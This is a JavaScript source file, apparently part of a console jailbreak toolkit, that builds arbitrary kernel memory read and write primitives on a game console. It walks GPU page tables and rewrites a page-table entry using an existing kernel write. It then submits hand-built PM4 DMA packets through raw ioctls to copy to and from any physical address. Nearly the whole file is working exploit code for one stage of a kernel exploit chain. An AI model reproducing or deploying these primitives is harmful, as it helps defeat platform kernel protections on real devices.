// https://github.com/shahrilnet/remote_lua_loader/blob/main/savedata/gpu.lua
// Credit to flatz and shadPS4 project for references

// GPU page table

const GPU_PDE_SHIFT = {
    VALID: 0,
    IS_PTE: 54,
    TF: 56,
    BLOCK_FRAGMENT_SIZE: 59,
};

const GPU_PDE_MASKS = {
    VALID: 1n,
    IS_PTE: 1n,
    TF: 1n,
    BLOCK_FRAGMENT_SIZE: 0x1fn,
};

const GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;

function gpu_pde_field(pde, field) {
    const shift = GPU_PDE_SHIFT[field];
    const mask = GPU_PDE_MASKS[field];
    return (pde >> BigInt(shift)) & mask;
}

function gpu_walk_pt(vmid, virt_addr) {
    const pdb2_addr = get_pdb2_addr(vmid);
    
    const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
    const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
    const pde_index = (virt_addr >> 21n) & 0x1ffn;
    
    // PDB2
    const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
    
    if (gpu_pde_field(pml4e, "VALID") !== 1n) {
        return null;
    }
    
    // PDB1
    const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);
    
    if (gpu_pde_field(pdpe, "VALID") !== 1n) {
        return null;
    }
    
    // PDB0
    const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);
    
    if (gpu_pde_field(pde, "VALID") !== 1n) {
        return null;
    }
    
    if (gpu_pde_field(pde, "IS_PTE") === 1n) {
        return [pde_va, 0x200000n]; // 2MB
    }
    
    // PTB
    const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
    const offset = virt_addr & 0x1fffffn;
    const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
    
    let pte_index, pte;
    let pte_va, page_size;
    
    if (fragment_size === 4n) {
        pte_index = offset >> 16n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        pte = kernel.read_qword(pte_va);
        
        if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
            pte_index = (virt_addr & 0xffffn) >> 13n;
            pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
            page_size = 0x2000n; // 8KB
        } else {
            page_size = 0x10000n; // 64KB
        }
    } else if (fragment_size === 1n) {
        pte_index = offset >> 13n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        page_size = 0x2000n; // 8KB
    }
    
    return [pte_va, page_size];
}

// Kernel r/w primitives based on GPU DMA

let gpu = {};

gpu.dmem_size = 2n * 0x100000n; // 2MB
gpu.fd = null; // GPU device file descriptor

// Direct ioctl helper functions

gpu.build_command_descriptor = function(gpu_addr, size_in_bytes) {
    // Each descriptor is 16 bytes (2 qwords)
    
    const desc = malloc(16);
    const size_in_dwords = BigInt(size_in_bytes) >> 2n;
    
    // First qword: (gpu_addr_low32 << 32) | 0xC0023F00
    const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;
    
    // Second qword: (size_in_dwords << 32) | (gpu_addr_high16)
    const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);
    
    write64(desc, qword0);
    write64(desc + 8n, qword1);
    
    return desc;
};

gpu.ioctl_submit_commands = function(pipe_id, cmd_count, cmd_descriptors_ptr) {
    // ioctl 0xC0108102
    // Structure: [dword pipe_id][dword count][qword cmd_buf_ptr]
    
    const submit_struct = malloc(0x10);
    write32(submit_struct + 0x0n, BigInt(pipe_id));
    write32(submit_struct + 0x4n, BigInt(cmd_count));
    write64(submit_struct + 0x8n, cmd_descriptors_ptr);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
    if (ret !== 0n) {
        throw new Error("ioctl submit failed: " + toHex(ret));
    }
};

// may be not needed...
gpu.ioctl_gpu_sync = function() {
    // ioctl 0xC0048117
    // Structure: [dword value] (set to 0)
    
    const sync_struct = malloc(0x4);
    write32(sync_struct, 0n);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048117n, sync_struct);

};

gpu.ioctl_wait_done = function() {
    // ioctl 0xC0048116
    // Structure: [dword value] (set to 0)
    
    const wait_struct = malloc(0x4);
    write32(wait_struct, 0n);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048116n, wait_struct);
    
    // We just ignore error lol
    //if (ret !== 0n) {
    //    throw new Error("ioctl wait_done failed: " + toHex(ret));
    //}
};

gpu.setup = function() {
    check_kernel_rw();
    
    // Open GPU device directly
    gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
    if (gpu.fd === 0xffffffffffffffffn) {
        throw new Error("Failed to open /dev/gc");
    }
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    
    const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
    const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);
    
    const result = get_ptb_entry_of_relative_va(victim_va);
    if (!result) {
        throw new Error("failed to setup gpu primitives");
    }
    
    const [victim_ptbe_va, page_size] = result;
    
    if (!victim_ptbe_va || page_size !== gpu.dmem_size) {
        throw new Error("failed to setup gpu primitives");
    }
    
    if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
    const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);
    
    gpu.victim_va = victim_va;
    gpu.transfer_va = transfer_va;
    gpu.cmd_va = cmd_va;
    gpu.victim_ptbe_va = victim_ptbe_va;
    gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
};

gpu.pm4_type3_header = function(opcode, count) {
    
    const packet_type = 3n;
    const shader_type = 1n;  // compute shader
    const predicate = 0n;    // predicate disable
    
    const result = (
        (predicate & 0x0n) |                      // Predicated version of packet when set
        ((shader_type & 0x1n) << 1n) |            // 0: Graphics, 1: Compute Shader
        ((opcode & 0xffn) << 8n) |        // IT opcode
        (((count - 1n) & 0x3fffn) << 16n) |  // Number of DWORDs - 1 in the information body
        ((packet_type & 0x3n) << 30n)             // Packet identifier. It should be 3 for type 3 packets
    );
    
    return result & 0xFFFFFFFFn;
};

gpu.pm4_dma_data = function(dest_va, src_va, length) {
    const count = 6n;
    const bufsize = Number(4n * (count + 1n));
    const opcode = 0x50n;
    const command_len = BigInt(length) & 0x1fffffn;
    
    const pm4 = malloc(bufsize);
    
    const dma_data_header = (
        (0n & 0x1n) |                    // engine
        ((0n & 0x1n) << 12n) |           // src_atc
        ((2n & 0x3n) << 13n) |           // src_cache_policy
        ((1n & 0x1n) << 15n) |           // src_volatile
        ((0n & 0x3n) << 20n) |           // dst_sel (DmaDataDst enum)
        ((0n & 0x1n) << 24n) |           // dst_atc
        ((2n & 0x3n) << 25n) |           // dst_cache_policy
        ((1n & 0x1n) << 27n) |           // dst_volatile
        ((0n & 0x3n) << 29n) |           // src_sel (DmaDataSrc enum)
        ((1n & 0x1n) << 31n)             // cp_sync
    ) & 0xFFFFFFFFn;
    
    write32(pm4, gpu.pm4_type3_header(opcode, count)); // pm4 header
    write32(pm4 + 0x4n, dma_data_header); // dma data header (copy: mem -> mem)
    write32(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
    write32(pm4 + 0xcn, src_va >> 32n);
    write32(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
    write32(pm4 + 0x14n, dest_va >> 32n);
    write32(pm4 + 0x18n, command_len);
    
    return read_buffer(pm4, bufsize);
};

gpu.submit_dma_data_command = function(dest_va, src_va, size) {
    // Prep command buf
    const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
    write_buffer(gpu.cmd_va, dma_data);
    
    // Build command descriptor manually
    const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);
    
    const pipe_id = 0;
    
    gpu.ioctl_gpu_sync();
    
    // Submit to gpu via direct ioctl
    gpu.ioctl_submit_commands(pipe_id, 1, desc);
    
    gpu.ioctl_gpu_sync();
    
    // Wait for completion
    gpu.ioctl_wait_done();
};

gpu.transfer_physical_buffer = function(phys_addr, size, is_write) {
    const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
    const offset = phys_addr - trunc_phys_addr;
    
    if (offset + BigInt(size) > gpu.dmem_size) {
        throw new Error("error: trying to write more than direct memory size: " + size);
    }
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    // Remap PTD
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
    kernel.write_qword(gpu.victim_ptbe_va, new_ptb);
    
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    let src, dst;
    
    if (is_write) {
        src = gpu.transfer_va;
        dst = gpu.victim_va + offset;
    } else {
        src = gpu.victim_va + offset;
        dst = gpu.transfer_va;
    }
    
    // Do the DMA operation
    gpu.submit_dma_data_command(dst, src, size);
};

gpu.read_buffer = function(addr, size) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + toHex(addr) + " to physical addr");
    }
    
    gpu.transfer_physical_buffer(phys_addr, size, false);
    return read_buffer(gpu.transfer_va, size);
};

gpu.write_buffer = function(addr, buf) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + toHex(addr) + " to physical addr");
    }
    
    write_buffer(gpu.transfer_va, buf); // prepare data for write
    gpu.transfer_physical_buffer(phys_addr, buf.length, true);
};

gpu.read_byte = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

gpu.read_word = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

gpu.read_dword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.read_qword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

gpu.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

// Misc functions

function alloc_main_dmem(size, prot, flag) {
    if (!size || prot === null || prot === undefined) {
        throw new Error("alloc_main_dmem: size and prot are required");
    }
    
    const out = malloc(8);
    const mem_type = 1n;
    
    const size_big = typeof size === "bigint" ? size : BigInt(size);
    const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
    const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
    
    const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
    if (ret !== 0n) {
        throw new Error("sceKernelAllocateMainDirectMemory() error: " + toHex(ret));
    }
    
    const phys_addr = read64(out);
    write64(out, 0n);
    
    // Dummy name
    const name_buf = alloc_string("mem");
    
    const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
    if (ret2 !== 0n) {
        throw new Error("sceKernelMapNamedDirectMemory() error: " + toHex(ret2));
    }
    
    return read64(out);
}

function get_curproc_vmid() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
    return Number(vmid);
}

function get_gvmspace(vmid) {
    if (vmid === null || vmid === undefined) {
        throw new Error("vmid is required");
    }
    const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
    const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
    return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
}

function get_pdb2_addr(vmid) {
    const gvmspace = get_gvmspace(vmid);
    return kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_PAGE_DIR_VA);
}

function get_relative_va(vmid, va) {
    if (typeof va !== "bigint") {
        throw new Error("va must be BigInt");
    }
    
    const gvmspace = get_gvmspace(vmid);
    
    const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
    const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
    const end_addr = start_addr + size;
    
    if (va >= start_addr && va < end_addr) {
        return va - start_addr;
    }
    
    return null;
}

function get_ptb_entry_of_relative_va(virt_addr) {
    const vmid = get_curproc_vmid();
    const relative_va = get_relative_va(vmid, virt_addr);
    
    if (!relative_va) {
        throw new Error("invalid virtual addr " + toHex(virt_addr) + " for vmid " + vmid);
    }
    
    return gpu_walk_pt(vmid, relative_va);
}